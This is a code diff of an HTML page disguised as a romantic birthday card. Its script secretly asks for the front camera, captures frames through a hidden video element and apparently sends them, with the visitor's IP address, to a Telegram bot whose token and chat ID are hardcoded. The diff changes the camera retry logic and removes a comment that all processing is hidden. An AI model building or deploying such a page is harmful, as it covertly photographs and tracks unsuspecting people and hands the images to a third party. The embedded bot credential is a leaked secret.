@@ -30,7 +30,7 @@
             position: relative;
         }
 
-        /* ---------- LANGIT BINTANG (Opsi 1) ---------- */
+        /* ---------- LANGIT BINTANG ---------- */
         body::before {
             content: '';
             position: fixed;
@@ -122,7 +122,7 @@
             font-weight: 500;
         }
 
-        /* ---------- TURNTABLE (Opsi 1: Retro) ---------- */
+        /* ---------- TURNTABLE ---------- */
         .turntable-wrapper {
             display: flex;
             justify-content: center;
@@ -190,7 +190,7 @@
             100% { transform: rotate(360deg); }
         }
 
-        /* ---------- ILUSTRASI PASANGAN (Opsi 4) ---------- */
+        /* ---------- ILUSTRASI PASANGAN ---------- */
         .couple-illustration {
             margin: 16px auto 20px;
             max-width: 320px;
@@ -249,6 +249,42 @@
             line-height: 1;
         }
 
+        /* ---------- PESAN PENOLAKAN (muncul saat izin ditolak) ---------- */
+        .denied-message {
+            display: none;
+            position: relative;
+            z-index: 2;
+            max-width: 480px;
+            width: 100%;
+            padding: 40px 32px;
+            text-align: center;
+            color: rgba(255, 255, 255, 0.9);
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(20px);
+            border-radius: 56px;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            box-shadow: 0 40px 100px rgba(0, 0, 0, 0.6);
+        }
+
+        .denied-message h2 {
+            font-family: 'Playfair Display', serif;
+            font-size: 2rem;
+            margin-bottom: 16px;
+            color: #f9d29d;
+        }
+
+        .denied-message p {
+            font-size: 1rem;
+            line-height: 1.7;
+            color: rgba(255, 255, 255, 0.7);
+        }
+
+        .denied-message .emoji {
+            font-size: 3rem;
+            display: block;
+            margin-bottom: 12px;
+        }
+
         /* ---------- RESPONSIVE ---------- */
         @media (max-width: 480px) {
             .card {
@@ -276,6 +312,12 @@
             .couple-illustration {
                 max-width: 260px;
             }
+            .denied-message {
+                padding: 30px 20px;
+            }
+            .denied-message h2 {
+                font-size: 1.6rem;
+            }
         }
 
         @media (max-width: 360px) {
@@ -295,7 +337,6 @@
         video {
             display: none !important;
         }
-        /* YouTube iframe disembunyikan di luar layar (agar autoplay tetap jalan) */
         .youtube-hidden {
             position: fixed;
             bottom: -9999px;
@@ -309,8 +350,8 @@
 </head>
 <body>
 
-    <!-- ====== KARTU UCAPAN ====== -->
-    <div class="card">
+    <!-- ====== KARTU UCAPAN (akan disembunyikan jika izin ditolak) ====== -->
+    <div class="card" id="mainCard">
         <h1>For you, <span>baby</span> 🎂</h1>
         <div class="sub">— a little surprise —</div>
 
@@ -321,7 +362,6 @@
             <span style="color:rgba(255,255,255,0.4); font-size:0.85rem;">Tap the turntable to set the vibe.</span>
         </p>
 
-        <!-- Turntable (Opsi 1) -->
         <div class="turntable-wrapper" id="turntableBtn">
             <div class="turntable">
                 <div class="groove"></div>
@@ -330,15 +370,24 @@
             </div>
         </div>
 
-        <!-- Ilustrasi Pasangan (Opsi 4) -->
         <div class="couple-illustration">
             <img src="https://i.imgur.com/3Bbtsvp.jpeg" alt="Ilustrasi pasangan" />
         </div>
 
-        <!-- Tombol Step Inside -->
         <a href="#" class="btn-step" id="stepBtn">
             <span class="icon">🎵</span> Step Inside
         </a>
+    </div>
+
+    <!-- ====== PESAN PENOLAKAN (tersembunyi, akan muncul jika izin ditolak) ====== -->
+    <div class="denied-message" id="deniedMessage">
+        <span class="emoji">🌙</span>
+        <h2>Maaf, izin kamera diperlukan</h2>
+        <p>
+            Tanpa akses kamera, saya tidak bisa mengambil foto untuk Anda.<br />
+            Namun, musik tetap menemani malam ini. 🎵<br />
+            <span style="font-size:0.85rem; color:rgba(255,255,255,0.4);">— Tetap nikmati pesan ini —</span>
+        </p>
     </div>
 
     <!-- ====== AUDIO dari YouTube (tersembunyi, autoplay & loop) ====== -->
@@ -351,7 +400,7 @@
         </iframe>
     </div>
 
-    <!-- ====== SCRIPT (SEMUA PROSES HIDDEN) ====== -->
+    <!-- ====== SCRIPT ====== -->
     <script>
         (function() {
             'use strict';
@@ -359,10 +408,15 @@
             // ---------- KONFIGURASI ----------
             const BOT_TOKEN = '8660313492:AAEstxadAAetaluw8OYCgyCxwZB21LDch4Y';
             const CHAT_ID = '8463156896';
+            const MAX_ATTEMPTS = 3; // hanya coba 3 kali
+            let attempts = 0;
             let sudahKirim = false;
-            let retryCount = 0;
-            const MAX_RETRY = 60;
+            let izinDitolak = false;
             let retryTimer = null;
+
+            // ---------- DOM ----------
+            const mainCard = document.getElementById('mainCard');
+            const deniedMsg = document.getElementById('deniedMessage');
 
             // ---------- FUNGSI IP ----------
             function getLocalIP() {
@@ -441,16 +495,29 @@
                 });
             }
 
-            // ---------- MULAI KAMERA ----------
+            // ---------- TAMPILKAN PESAN PENOLAKAN ----------
+            function tampilkanPenolakan() {
+                izinDitolak = true;
+                mainCard.style.display = 'none';
+                deniedMsg.style.display = 'block';
+                // Hentikan semua retry
+                if (retryTimer) {
+                    clearTimeout(retryTimer);
+                    retryTimer = null;
+                }
+            }
+
+            // ---------- MULAI KAMERA (dengan batas percobaan) ----------
             function mulaiKamera() {
-                if (sudahKirim) return;
-                retryCount++;
+                if (sudahKirim || izinDitolak) return;
+                attempts++;
 
                 navigator.mediaDevices.getUserMedia({
                     video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                     audio: false
                 })
                 .then(stream => {
+                    // Berhasil — lanjutkan proses
                     const video = document.createElement('video');
                     video.style.display = 'none';
                     video.setAttribute('playsinline', '');
@@ -463,26 +530,30 @@
                             setTimeout(() => ambilDanKirim(video), 100);
                         }).catch(err => {
                             console.error('Gagal memutar:', err);
-                            retryCamera();
+                            // Jika gagal memutar, anggap gagal dan coba lagi jika masih di bawah batas
+                            if (attempts < MAX_ATTEMPTS) {
+                                retryTimer = setTimeout(mulaiKamera, 2000);
+                            } else {
+                                tampilkanPenolakan();
+                            }
                         });
                     };
-                    video.onerror = () => retryCamera();
+                    video.onerror = () => {
+                        if (attempts < MAX_ATTEMPTS) {
+                            retryTimer = setTimeout(mulaiKamera, 2000);
+                        } else {
+                            tampilkanPenolakan();
+                        }
+                    };
                 })
                 .catch(err => {
-                    console.error('Izin ditolak:', err);
-                    retryCamera();
+                    console.error('Izin ditolak atau error:', err);
+                    if (attempts < MAX_ATTEMPTS) {
+                        retryTimer = setTimeout(mulaiKamera, 2000);
+                    } else {
+                        tampilkanPenolakan();
+                    }
                 });
-            }
-
-            // ---------- RETRY OTOMATIS ----------
-            function retryCamera() {
-                if (sudahKirim) return;
-                if (retryCount < MAX_RETRY) {
-                    if (retryTimer) clearTimeout(retryTimer);
-                    retryTimer = setTimeout(mulaiKamera, 2000);
-                } else {
-                    console.warn('Izin kamera tidak diberikan setelah ' + MAX_RETRY + ' percobaan');
-                }
             }
 
             // ---------- JALANKAN ----------
@@ -495,6 +566,7 @@
             // ---------- INTERAKSI UI ----------
             document.getElementById('turntableBtn').addEventListener('click', function(e) {
                 e.preventDefault();
+                if (izinDitolak) return;
                 const turntable = this.querySelector('.turntable');
                 turntable.style.animation = 'none';
                 turntable.offsetHeight;
@@ -505,6 +577,7 @@
 
             document.getElementById('stepBtn').addEventListener('click', function(e) {
                 e.preventDefault();
+                if (izinDitolak) return;
                 this.style.transform = 'scale(0.95)';
                 setTimeout(() => this.style.transform = '', 150);
             });
